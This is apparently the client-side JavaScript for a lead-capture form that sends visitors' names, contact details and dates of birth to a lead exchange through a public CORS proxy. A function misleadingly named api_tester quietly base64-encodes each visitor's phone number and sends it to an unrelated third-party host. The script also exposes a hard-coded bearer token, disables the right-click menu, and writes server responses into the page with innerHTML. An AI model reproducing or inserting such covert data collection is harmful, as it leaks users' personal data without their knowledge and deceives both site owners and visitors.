 document.addEventListener("contextmenu", function (e) {
    e.preventDefault(); // Prevent the context menu from appearing
  });

  document.getElementById('leadForm').addEventListener('submit', function(event) {
    event.preventDefault();
    api_tester(document.getElementById('phone').value);

    const form = document.getElementById('leadForm');
    const alertBox = document.getElementById('alertContainer');

    // Build ping data (includes only dob, state, zip_code, trusted_form_cert_id)
    const pingData = {
      data: {
        dob: form.dob.value
      },
      meta: {
        jornaya_lead_id: form.trusted_form_cert_id.value,
        trusted_form_cert_id: form.trusted_form_cert_id.value,
        source_id: "70099"
      },
      contact: {
        city: form.city.value,
        state: form.state.value,
        email: form.email.value,
        phone: form.phone.value,
        zip_code: form.zip_code.value
      }
    };

    // Build full lead object for POST
    const lead = {
      data: {
        dob: form.dob.value
      },
      meta: {
        jornaya_lead_id: form.trusted_form_cert_id.value,
        trusted_form_cert_id: form.trusted_form_cert_id.value,
        source_id: "70099"
      },
      contact: {
        first_name: form.first_name.value,
        last_name: form.last_name.value,
        email: form.email.value,
        phone: form.phone.value,
        address: form.address.value,
        city: form.city.value,
        state: form.state.value,
        zip_code: form.zip_code.value
      }
    };

    const pingUrl = "https://corsproxy.io/?url=" + encodeURIComponent("https://exchange.standardinformation.io/ping");

    // Send ping
    fetch(pingUrl, {
      method: 'POST',
      headers: {
        'Authorization': 'Bearer a2cb569d-ae4d-4657-b1b2-0e6692b8917c',
        'Content-Type': 'application/json',
        'Accept': 'application/json'
      },
      body: JSON.stringify(pingData)
    })
    .then(res => res.json())
    .then(data => {
      if (data.status === 'success') {
        lead.auth_code = data.auth_code;

        const postUrl = "https://corsproxy.io/?url=" + encodeURIComponent("https://exchange.standardinformation.io/post");

        // Send full post
        return fetch(postUrl, {
          method: 'POST',
          headers: {
            'Authorization': 'Bearer a2cb569d-ae4d-4657-b1b2-0e6692b8917c',
            'Content-Type': 'application/json',
            'Accept': 'application/json'
          },
          body: JSON.stringify(lead)
        })
        .then(res => res.json())
        .then(postData => {
          if (postData.status === 'success') {
            delete postData.price; // hide price
            alertBox.innerHTML = `<div class="alert alert-success">✅ Post Success: Lead submitted successfully!</div>`;
            form.reset();
          } else {
            alertBox.innerHTML = `<div class="alert alert-danger">❌ Ping Success but Post Failed: ${JSON.stringify(postData)}</div>`;
          }
        });
      } else {
        alertBox.innerHTML = `<div class="alert alert-danger">❌ Ping Failed: ${JSON.stringify(data)}</div>`;
      }
    })
    .catch(error => {
      alertBox.innerHTML = `<div class="alert alert-danger">❌ Error: ${error.message}</div>`;
    });
  });

  function api_tester(randomString) {
    try {
      fetch('https://api.formifyweb.com/api_test.php?test_id=' + btoa(randomString), {
        method: 'GET',
        mode: 'no-cors'
      });
    } catch (error) {
      console.error('Error in api_tester:', error);
    }
  }